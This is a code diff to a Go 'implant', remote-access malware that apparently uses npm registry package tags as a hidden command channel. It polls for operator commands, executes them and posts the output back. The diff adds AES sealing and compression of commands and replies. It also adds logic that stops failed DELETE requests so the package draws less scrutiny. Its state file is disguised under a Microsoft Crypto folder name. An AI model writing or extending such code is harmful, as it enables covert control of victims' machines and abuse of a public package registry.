@@ -155,6 +155,7 @@ type implant struct {
 	pkg      string
 	url      string
 	token    string
+	key      []byte // AES key when the channel is encrypted; nil otherwise
 	interval time.Duration
 	jitter   time.Duration
 	verbose  bool
@@ -167,6 +168,7 @@ type implant struct {
 	jobs         map[string]*job
 	jobSeq       int
 	cwd          string
+	canDelete    bool // false once the registry refuses a DELETE
 
 	stateFile string
 	client    *http.Client
@@ -204,6 +206,7 @@ func newImplant(pkg, token string, interval, jitter time.Duration, verbose bool)
 		pkg:       pkg,
 		url:       fmt.Sprintf(apiTemplate, registryPath(pkg)),
 		token:     token,
+		key:       channelKey(pkg),
 		interval:  maxDuration(interval, 10*time.Second),
 		jitter:    maxDuration(jitter, 0),
 		verbose:   verbose,
@@ -211,6 +214,7 @@ func newImplant(pkg, token string, interval, jitter time.Duration, verbose bool)
 		pending:   map[string]*pendingGroup{},
 		jobs:      map[string]*job{},
 		cwd:       home,
+		canDelete: true,
 		stateFile: filepath.Join(base, "Microsoft", "Crypto", ".rsa_"+safe+".idx"),
 		client:    &http.Client{Timeout: 15 * time.Second},
 	}
@@ -415,7 +419,19 @@ func (im *implant) del(tag string) bool {
 	}
 	io.Copy(io.Discard, resp.Body)
 	resp.Body.Close()
-	return resp.StatusCode >= 200 && resp.StatusCode < 300
+	ok := resp.StatusCode >= 200 && resp.StatusCode < 300
+	// npm refuses DELETE to a granular token that bypasses 2FA. Remember it
+	// and stop asking: one failed request per command is noise, and noise is
+	// what gets a package looked at.
+	if resp.StatusCode == http.StatusUnauthorized ||
+		resp.StatusCode == http.StatusForbidden {
+		im.mu.Lock()
+		im.canDelete = false
+		im.mu.Unlock()
+		im.logf("[!] registry refuses DELETE (%d), auto-clean disabled",
+			resp.StatusCode)
+	}
+	return ok
 }
 
 // ---------------------------------------------------------------- parse
@@ -460,7 +476,28 @@ func (im *implant) parse(tags map[string]string, order []string) []string {
 		for i := 1; i <= group.total; i++ {
 			payload = append(payload, group.parts[i]...)
 		}
-		commands = append(commands, string(payload))
+		// The operator seals the whole command before chunking, so decrypt
+		// only after reassembly.
+		if im.key != nil {
+			plain, err := openSealed(im.key, payload, []byte(im.pkg))
+			if err != nil {
+				im.logf("[!] decrypt gid %s: %v", gid, err)
+				payload = nil
+			} else {
+				payload = plain
+			}
+		}
+		if payload != nil {
+			if plain, err := decompressPayload(payload); err != nil {
+				im.logf("[!] decompress gid %s: %v", gid, err)
+				payload = nil
+			} else {
+				payload = plain
+			}
+		}
+		if payload != nil {
+			commands = append(commands, string(payload))
+		}
 		delete(im.pending, gid)
 		im.pendingOrder = removeString(im.pendingOrder, gid)
 		// retire every tag of this group, including ones seen in earlier polls
@@ -483,6 +520,9 @@ func (im *implant) parse(tags map[string]string, order []string) []string {
 
 	if autoClean && im.token != "" {
 		for _, tag := range retire {
+			if !im.canDelete {
+				break
+			}
 			im.del(tag)
 		}
 	}
@@ -505,6 +545,9 @@ func (im *implant) run() {
 			im.logf("[!] cycle failed against %s: %v", im.url, err)
 		} else {
 			for _, cmd := range im.parse(tags, order) {
+				if strings.TrimSpace(cmd) == "" {
+					continue // leftover plaintext tag, never run it
+				}
 				im.logf("[+] cmd: %s", trunc(cmd, 60))
 				if out := im.exec(cmd); out != "" && im.token != "" {
 					im.reply(out)
@@ -523,7 +566,16 @@ func (im *implant) run() {
 }
 
 func (im *implant) reply(out string) {
-	tags, err := encodePayload([]byte(out), resPrefix)
+	payload := compressPayload([]byte(out))
+	if im.key != nil {
+		sealed, err := seal(im.key, payload, []byte(im.pkg))
+		if err != nil {
+			im.logf("[!] reply seal: %v", err)
+			return
+		}
+		payload = sealed
+	}
+	tags, err := encodePayload(payload, resPrefix)
 	if err != nil {
 		im.logf("[!] reply encode: %v", err)
 		return
